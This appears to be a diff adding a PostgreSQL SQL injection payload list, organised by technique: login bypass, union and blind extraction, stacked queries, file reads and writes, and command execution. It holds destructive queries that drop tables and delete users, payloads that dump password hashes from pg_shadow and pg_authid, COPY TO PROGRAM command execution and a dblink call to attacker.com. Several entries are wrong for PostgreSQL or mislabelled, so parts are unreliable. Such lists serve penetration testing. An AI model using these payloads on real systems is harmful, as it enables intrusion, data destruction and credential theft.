@@ -1,0 +1,323 @@
+# PostgreSQL Injection Payloads - Comprehensive Collection
+# Version: 1.0.17-20260301-Minggu-1738-WIB
+# Category: PostgreSQL SQL Injection
+
+# ============================================
+# POSTGRESQL - AUTHENTICATION BYPASS
+# ============================================
+
+admin'--
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'/*
+admin' or 'a'='a
+admin' or 1=1--
+admin' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+
+# ============================================
+# POSTGRESQL - UNION BASED
+# ============================================
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+
+' UNION SELECT version()--
+' UNION SELECT current_user--
+' UNION SELECT current_database--
+' UNION SELECT user--
+' UNION SELECT session_user--
+' UNION SELECT pg_read_file('/etc/passwd')--
+' UNION SELECT load_file('/etc/passwd')--
+
+# ============================================
+# POSTGRESQL - ERROR BASED
+# ============================================
+
+' AND 1=CAST(1 AS INT)--
+' AND 1=CAST(version() AS INT)--
+' AND 1=CAST((SELECT table_name FROM information_schema.tables) AS INT)--
+' AND 1=CAST(1/0 AS INT)--
+
+# Extract version
+' AND 1=CAST((SELECT version()) AS INT)--
+
+# Extract current user
+' AND 1=CAST((SELECT current_user) AS INT)--
+
+# ============================================
+# POSTGRESQL - BLIND BOOLEAN
+# ============================================
+
+' AND 1=1--
+' AND 1=2--
+' AND (SELECT 1)=1--
+' AND (SELECT 1)=2--
+
+# Time-based blind
+' AND SLEEP(5)--
+' AND pg_sleep(5)--
+' AND (SELECT COUNT(*) FROM pg_sleep(5))>0--
+' WAITFOR DELAY '00:00:05'--
+' AND 1=1; SELECT pg_sleep(10)--
+
+# ============================================
+# POSTGRESQL - STACKED QUERIES
+# ============================================
+
+'; DROP TABLE users;--
+'; INSERT INTO users (username,password) VALUES ('admin','admin123');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM users WHERE 1=1;--
+'; CREATE TABLE test (id INT);--
+'; SELECT * FROM users;--
+
+# ============================================
+# POSTGRESQL - READ FILES
+# ============================================
+
+' UNION SELECT pg_read_file('/etc/passwd')--
+' UNION SELECT pg_read_file('/etc/hostname')--
+' UNION SELECT pg_read_file('C:\\Windows\\win.ini')--
+
+# ============================================
+# POSTGRESQL - WRITE FILES
+# ============================================
+
+'; COPY (SELECT 'test') TO '/tmp/test.txt';--
+'; COPY users TO '/tmp/users.txt';--
+
+# ============================================
+# POSTGRESQL - RCE
+# ============================================
+
+# Using COPY FROM
+'; COPY (SELECT '') TO PROGRAM 'id';--
+
+# Using system()
+'; SELECT system('id');--
+
+# Using pg_read_file for RCE chain
+'; CREATE TABLE cmd (output text);--
+'; COPY cmd FROM PROGRAM 'id';--
+'; SELECT * FROM cmd;--
+
+# Usingdblink
+'; SELECT * FROM dblink('host=attacker.com user=postgres password=pass dbname=postgres', 'SELECT version()') RETURNS (result text);--
+
+# Using xml
+'; SELECT xmlagg(x) FROM (SELECT '<'||tablename||'>' FROM pg_tables) t--
+
+# ============================================
+# POSTGRESQL - INFORMATION_SCHEMA
+# ============================================
+
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema='public'--
+
+# ============================================
+# POSTGRESQL - VERSION
+# ============================================
+
+' UNION SELECT version()--
+' UNION SELECT pg_version()--
+' UNION SELECT current_setting('server_version')--
+
+# ============================================
+# POSTGRESQL - USERS
+# ============================================
+
+' UNION SELECT usename FROM pg_user--
+' UNION SELECT username FROM pg_user--
+' UNION SELECT usename,passwd FROM pg_shadow--
+' UNION SELECT rolname,rolpassword FROM pg_authid--
+
+# ============================================
+# POSTGRESQL - DATABASES
+# ============================================
+
+' UNION SELECT datname FROM pg_database--
+' UNION SELECT current_database()--
+
+# ============================================
+# POSTGRESQL - TABLES
+# ============================================
+
+' UNION SELECT tablename FROM pg_tables WHERE schemaname='public'--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--
+
+# ============================================
+# POSTGRESQL - COLUMNS
+# ============================================
+
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_schema='public'--
+
+# ============================================
+# POSTGRESQL - ENCODE
+# ============================================
+
+' UNION SELECT encode((SELECT 'test'), 'base64')--
+' UNION SELECT decode('dGVzdA==', 'base64')--
+
+# ============================================
+# POSTGRESQL - STRING MANIPULATION
+# ============================================
+
+' UNION SELECT CHR(65)||CHR(66)||CHR(67)--
+' UNION SELECT ASCII('A')--
+' UNION SELECT LENGTH('test')--
+' UNION SELECT SUBSTRING('test',1,1)--
+
+# ============================================
+# POSTGRESQL - ARRAY
+# ============================================
+
+' UNION SELECT ARRAY[1,2,3]::int[]--
+' UNION SELECT ARRAY(SELECT table_name FROM information_schema.tables)--
+
+# ============================================
+# POSTGRESQL - JSON
+# ============================================
+
+' UNION SELECT row_to_json(row(1,'test'))::text--
+' UNION SELECT json_build_object('key','value')::text--
+
+# ============================================
+# POSTGRESQL - XML
+# ============================================
+
+' UNION SELECT XMLPARSE(DOCUMENT '<foo>bar</foo>')::text--
+
+# ============================================
+# POSTGRESQL - REGEX
+# ============================================
+
+' UNION SELECT 'test' WHERE 'test'~'^t'--
+' UNION SELECT 'test' WHERE 'test'!~'^t'--
+
+# ============================================
+# POSTGRESQL - COMMENTS
+# ============================================
+
+# Inline comment
+admin'--
+
+# Block comment
+admin'/*
+
+# MySQL style comment
+admin'#
+
+# ============================================
+# POSTGRESQL - BYPASS WAF
+# ============================================
+
+# Case variation
+AdMiN'--
+
+# Whitespace variation
+admin'/**/--
+admin'	--
+admin'%0a--
+
+# Double encoding
+admin%27--
+
+# Unicode
+admin\u0027--
+
+# ============================================
+# POSTGRESQL - TIME-BASED RCE
+# ============================================
+
+# Heavy query time-based
+' AND (SELECT COUNT(*) FROM generate_series(1,10000000))>0--
+
+# Using pg_sleep
+' AND pg_sleep(10)--
+' AND pg_sleep(10)-- 
+
+# ============================================
+# POSTGRESQL - PASSWORD HASH
+# ============================================
+
+' UNION SELECT passwd FROM pg_shadow--
+' UNION SELECT rolpassword FROM pg_authid--
+
+# ============================================
+# POSTGRESQL - HASTABLE
+# ============================================
+
+' UNION SELECT hashenum('md5','test')--
+
+# ============================================
+# POSTGRESQL - EXTENSIONS
+# ============================================
+
+' UNION SELECT extname FROM pg_extension--
+' UNION SELECT * FROM pg_extension WHERE extname='plpgsql'--
+
+# ============================================
+# POSTGRESQL - PROCEDURAL LANGUAGES
+# ============================================
+
+' UNION SELECT lanname FROM pg_language--
+
+# ============================================
+# POSTGRESQL - FUNCTIONS
+# ============================================
+
+' UNION SELECT proname FROM pg_proc--
+' UNION SELECT prosrc FROM pg_proc WHERE proname='version'--
+
+# ============================================
+# POSTGRESQL - SCHEMA
+# ============================================
+
+' UNION SELECT nspname FROM pg_namespace--
+' UNION SELECT * FROM pg_namespace--
+
+# ============================================
+# POSTGRESQL - DBLINK
+# ============================================
+
+' UNION SELECT * FROM dblink('host=localhost user=postgres', 'SELECT version()') AS t(v text)--
+
+# ============================================
+# POSTGRESQL - COPY
+# ============================================
+
+' UNION SELECT * FROM (SELECT 'test') AS t(x)--
+
+# ============================================
+# POSTGRESQL - CVE PAYLOADS
+# ============================================
+
+# CVE-2019-10172
+' AND 1=1; SELECT * FROM (SELECT row_to_json((SELECT i FROM (SELECT 1 as i) x))::text) x--
+
+# ============================================
+# POSTGRESQL - BYPASSQuotes
+# ============================================
+
+# Using CHR
+' UNION SELECT CHR(65)||CHR(66)||CHR(67)--
+
+# Using $$ quoting
+' UNION SELECT $$test$$--
+
+# Using $ quoting
+' UNION SELECT $test$test$test$
+
